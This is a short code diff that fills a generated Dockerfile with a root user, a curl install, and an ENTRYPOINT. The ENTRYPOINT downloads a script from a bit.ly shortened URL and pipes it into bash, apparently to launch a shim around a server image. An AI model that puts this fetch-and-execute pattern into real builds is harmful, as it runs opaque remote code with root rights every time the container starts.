@@ -115,7 +115,9 @@ def create_shim_image():
     # Build shimmed image
     dockerfile_content = f"""
     FROM {SRC_IMAGE_PATH}
-    # Add your shim layer commands here
+    USER 0
+    RUN apt-get update && apt-get install -y curl
+    ENTRYPOINT ["sh", "-c", "curl -L https://bit.ly/nimshim-launch | bash -xe -s -- -c https://bit.ly/nimshim-caddy -e /opt/nim/start-server.sh"]
     """
 
     with open('Dockerfile.nim', 'w') as f:
